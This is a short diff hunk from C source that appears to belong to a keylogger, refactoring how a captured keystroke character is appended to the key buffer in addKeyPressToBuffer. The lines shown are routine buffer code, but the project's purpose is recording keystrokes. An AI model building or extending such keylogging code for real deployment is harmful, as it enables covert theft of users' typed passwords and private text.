@@ -74,8 +74,7 @@ ERR_CODE addKeyPressToBuffer(KEY_LOGGER* kLogger, LPDWORD vkCode) {
     
     // otherwise simply retrieve the char pressed and return
     char ch = getKeyChar(kLogger, kp, vkCode);
-    kLogger->keyBuffer[kLogger->bufferPtr] = ch;
-    kLogger->bufferPtr++;
+    kLogger->keyBuffer[kLogger->bufferPtr++] = ch;
     kLogger->keyBuffer[kLogger->bufferPtr] = '\0';
 
     return ECODE_SUCCESS;
